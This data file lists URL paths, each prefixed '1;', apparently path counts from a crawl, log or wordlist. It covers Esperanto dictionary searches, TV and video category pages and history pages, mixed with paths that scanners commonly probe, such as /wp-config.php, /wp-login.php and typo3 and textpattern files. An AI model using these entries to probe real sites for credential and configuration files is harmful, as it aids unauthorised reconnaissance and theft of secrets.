1;/sercxo/%D1%81%D0%B0%D0%B9%D1%82+%D0%93%D0%BE%D1%80%D1%8F%D1%87%D0%B5%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%B2%D1%81%D0%BA%D0%BE%D0%B3%D0%BE+%D0%B3%D0%BE%D1%80%D0%BA%D0%BE%D0%BC%D0%B0+%D0%9A%D0%9F%D0%A0%D0%A4
1;/sercxo/%D1%81%D0%BB%D0%B0%D0%B4%D0%BA%D0%B0%D1%8F+%D1%81%D0%BC%D0%BE%D1%80%D0%BE%D0%B4%D0%B8%D0%BD%D0%B0
1;/sercxo/%D1%81%D0%BE%D0%BF%D1%80%D0%BE%D0%B2%D0%BE%D0%B6%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5+
1;/sercxo/%D1%81%D1%82%D0%B0%D0%BB%D0%B8%D0%BD%D1%81%D0%BA%D0%B8%D0%BC+%D1%81%D1%82%D0%B8%D0%BF%D0%B5%D0%BD%D0%B4%D0%B8%D0%B0%D1%82
1;/sercxo/%D1%81%D1%83%D0%BB%D1%82%D0%B0%D0%BD%D0%B0%D1%82+%D0%91%D1%80%D1%83%D0%BD%D0%B5%D0%B9
1;/sercxo/%D1%81+%D0%B1%D0%BB%D0%B0%D0%B3%D0%BE%D0%B4%D0%B0%D1%80%D0%BD%D0%BE%D1%81%D1%82%D1%8C%D1%8E
1;/sercxo/%D1%82%D0%BE%D0%BB%D0%BA%D0%B8%D0%B5%D0%BD+%D0%BE%D0%B1+%D1%8D%D1%81%D0%BF%D0%B5%D1%80%D0%B0%D0%BD%D1%82%D0%BE
1;/sercxo/%D1%83%D0%B1%D0%B8%D0%B9%D1%81%D1%82%D0%B2%D0%BE+%D1%81+%D1%85%D1%80%D0%B0%D0%BC%D0%B5+%D0%A1%D0%A8%D0%90
1;/sercxo/%D1%83%D0%BB%20%D0%BC%D0%B8%D0%BA%D0%BB%D1%83%D1%85%D0%BE-%D0%BC%D0%B0%D0%BA%D0%BB%D0%B0%D1%8F%20%D0%B4%D0%BE%D0%BC%2044%D0%90
1;/sercxo/%D1%83%D0%BB.%D0%94%D0%BE%D0%BA%D1%83%D0%BA%D0%B8%D0%BD%D0%B0,%20%D0%B4.16,%20%D0%BA%D0%BE%D1%80%D0%BF.3
1;/sercxo/%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82+mobi+%D1%87%D0%B5%D0%BC+%D0%BE%D1%82%D0%BA%D1%80%D1%8B%D1%82%D1%8C
1;/sercxo/%D1%8D%D0%BC%D0%BF%D0%B5%D1%80%D0%B0%D0%BD%D1%82%D0%BE+%D1%88%D0%B0%D0%B3+%D0%B7%D0%B0+%D1%88%D0%B0%D0%B3%D0%BE%D0%BC
1;/sercxo/+%D1%81%D0%BE%D0%BE%D1%82%D0%B2%D0%B5%D1%82%D1%81%D1%82%D0%B2%D0%B8%D0%B5
1;/sercxo/39828/http%3A//files.uz-translations.uz/ly5lpqrz817s.html
1;/sercxo/500+%D1%81%D0%B0%D0%BC%D1%8B%D1%85+%D0%B2%D0%B0%D0%B6%D0%BD%D1%8B%D1%85+%D1%81%D0%BB%D0%BE%D0%B2+%D1%8D%D1%81%D0%BF%D0%B5%D1%80%D0%B0%D0%BD%D1%82%D0%BE
1;/sercxo/afrekmntns%20xticrb%5B%20depjd
1;/sercxo/Akademio+de+Esperanto
1;/sercxo/alkro%3Fi%3Fi
1;/sercxo/as+la
1;/sercxo/Boris+Grigorjevi%C4%89
1;/sercxo/Boris+Kolker.+Voja%C4%9Do+en+Esperanto-lando
1;/sercxo/brako+%D1%80%D1%83%D0%BA%D0%B0
1;/sercxo/C%D1%83%D1%88%D0%BA%D0%BE%2C%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D0%B9+%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D0%B5%D0%B2%D0%B8%D1%87
1;/sercxo/cache/7c98c425e32af03fd6e78da12d7d49f4
1;/sercxo/Canon%20PowerShot%20G1%20X
1;/sercxo/cgthfynj
1;/sercxo/cj%5Bhfybnm
1;/sercxo/class_15%252Cclass_37
1;/sercxo/dank%27+al
1;/sercxo/De+sur
1;/sercxo/E%40I
1;/sercxo/eks%2Crf
1;/sercxo/erotika+rakonto
1;/sercxo/floboss%20s600
1;/sercxo/h/xaxaoru.?u/elsxuti/
1;/sercxo/http%253A//pop-music.ru/catalog.php%253Fid%253D888880014854&hash=bb11d2f57a5253d367664632bf63a454
1;/sercxo/http%3A//%20www.%20okulina.ru/
1;/sercxo/hugo%2099%20problems
1;/sercxo/insigno+esperanto
1;/sercxo/kompo+
1;/sercxo/kunligi%5D
1;/sercxo/la+plej
1;/sercxo/la+pr
1;/sercxo/le&
1;/sercxo/Lord+of+Ultima
1;/sercxo/mail.ru350.0.42244094.1.1.0.0.0.0.405.405.4-1.1.0...0.0.yiO-nDMKqhw%26pbx%3D1%26bav%3Don.2%2Cor.r_gc.r_pw.r_qf.%2Ccf.osb%26fp%3De190f4e6d679ab3a%26biw%3D1280%26bih%3D699
1;/sercxo/man%3Fema
1;/sercxo/Mate%201.2
1;/sercxo/Mi+estas+hejme
1;/sercxo/Mi+estas+tre+%C4%9Doja.+Anatolo%2C+kiomjaraj+estas+viaj+gefamilianoj
1;/sercxo/mk%3A@MSITStore%3AO%3A%5C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%5C%D0%A0%D0%B0%D0%B7%D0%B5%D1%82%D0%B4%D0%B8%D0%BD%D0%BE%D0%B2%20%D0%A0%D0%B0%D0%BD%D0%B8%D1%81%5CXLMAIN11.CHM%3A%3A//html/xlrefUsingshortcutkeys3.htm%23
1;/sercxo/multimedia.1c.u
1;/sercxo/neguso,
1;/sercxo/nhjkktq,ec
1;/sercxo/Nikon%20AF-S%20VR%20Nikkor%2070-200mm
1;/sercxo/Nome+de
1;/sercxo/Ok+delfenoj
1;/sercxo/Plena+Ilustrita+Vortaro
1;/sercxo/politekniko+
1;/sercxo/r/ciaos/kkau-rincjoolk.html
1;/sercxo/SAFT%20LS14250
1;/sercxo/t%C2%ADs
1;/sercxo/tcp+%D0%BA%D0%B0%D0%BA+%D1%81%D0%BA%D1%80%D1%8B%D1%82%D1%8C
1;/sercxo/TexFinder%20utf-8%20not%20found
1;/sercxo/Trjetjakovskaja+galerio
1;/sercxo/typeid+c%2B%2B
1;/sercxo/typeid+c++
1;/sercxo/url%20%3A%20http%3A//extjsinaction.com/dataQuery.php
1;/sercxo/vbh+nfyrjd+kexi
1;/sercxo/vnc%3A//server.com
1;/sercxo/w&usg=AFQjCNGVC8X71GyMh-XzcH3Difd_EbP0xg&cad=rjt
1;/sercxo/www.youtube.com%2Cwatch%3Fv%3De9ohvzo4lG8
1;/sercxo/yaragro.narod,ru
1;/sercxo?-unt-
1;/sercxo?sxati
1;/sercxo?unt
1;/sercxo?vorto=unt
1;/serxo
1;/site//wp-login.php
1;/site_map
1;/site_map.htm
1;/site_map.html
1;/site_map.php
1;/SSI.php
1;/story-begins
1;/story-begins/bibliography
1;/story-begins/burke-wadsworth-bill
1;/story-begins/civilian-public-service
1;/story-begins/conscientious-objection
1;/story-begins/interwar-conferences
1;/story-begins/meeting-president
1;/story-begins/nsbro
1;/story-begins/selective-service
1;/story-begins/work-national-importance
1;/story-begins/world-war-1
1;/storycontinues
1;/storycontinues/gaza
1;/storycontinues/hotline
1;/storycontinues/vietnam
1;/support
1;/support.htm
1;/support.html
1;/support.php
1;/sxafo
1;/t3lib/fonts/readme.txt
1;/target%5Bname%5D,copy=options%5Bname%5D;if(target===copy)
1;/templates/beez/index.php
1;/textpattern/
1;/textpattern/include/import/BloggerImportTemplate.txt
1;/tovar.php?tovar_id=1
1;/tv
1;/tv-peredachi
1;/tv-peredachi/biografiya
1;/tv-peredachi/comedy
1;/tv-peredachi/documental
1;/tv-peredachi/korotkometrazhnyij
1;/tv-peredachi/kriminal
1;/tv-peredachi/last
1;/tv-peredachi/new
1;/tv-peredachi/popular
1;/tv-peredachi/russkij-film
1;/tv-peredachi/sport
1;/tv-peredachi/zarubezhnyj-serial
1;/tv/action
1;/tv/adventure
1;/tv/biografiya
1;/tv/comedy
1;/tv/detective
1;/tv/detskiy
1;/tv/documental
1;/tv/drama
1;/tv/fantasy
1;/tv/history
1;/tv/horror
1;/tv/kriminal
1;/tv/last
1;/tv/melodrama
1;/tv/muzyka
1;/tv/mystic
1;/tv/myuzikl
1;/tv/new
1;/tv/popular
1;/tv/russkij-serial
1;/tv/scifiction
1;/tv/semejnyij
1;/tv/sex
1;/tv/sport
1;/tv/triller
1;/tv/voenniy
1;/tv/western
1;/tv/zarubezhnyj-serial
1;/typo3/border.html
1;/ucp.php?mode=register&agreed=true
1;/user
1;/user.php
1;/user/favorites
1;/user/login
1;/user/login/?next=/
1;/user/login/index.php
1;/utils/dashboard.php
1;/value.png
1;/video
1;/video/action
1;/video/adventure
1;/video/animaciya
1;/video/biografiya
1;/video/boevye-iskusstva
1;/video/comedy
1;/video/detective
1;/video/detskiy
1;/video/documental
1;/video/drama
1;/video/fantasy
1;/video/history
1;/video/horror
1;/video/korotkometrazhnyij
1;/video/kriminal
1;/video/last
1;/video/melodrama
1;/video/muzyka
1;/video/mystic
1;/video/myuzikl
1;/video/new
1;/video/parodiya
1;/video/popular
1;/video/russkij-film
1;/video/scifiction
1;/video/semejnyij
1;/video/sex
1;/video/skazka
1;/video/sovetskij
1;/video/spektakl
1;/video/sport
1;/video/triller
1;/video/voenniy
1;/video/western
1;/viewpage.php?page_id=1
1;/volume.net/category/internet/
1;/webstat/index.html
1;/wiki/pmwiki.php
1;/wordpress/wp-trackback.php
1;/workers
1;/workers/1388
1;/workers/1781
1;/workers/1892
1;/workers/2330
1;/workers/2378
1;/workers/2796
1;/workers/3983
1;/workers/4060
1;/workers/4747
1;/workers/817
1;/wp-admin.phpindex.php
1;/wp-config.php
1;/wp-trackback.php
1;/wp/wp-trackback.php
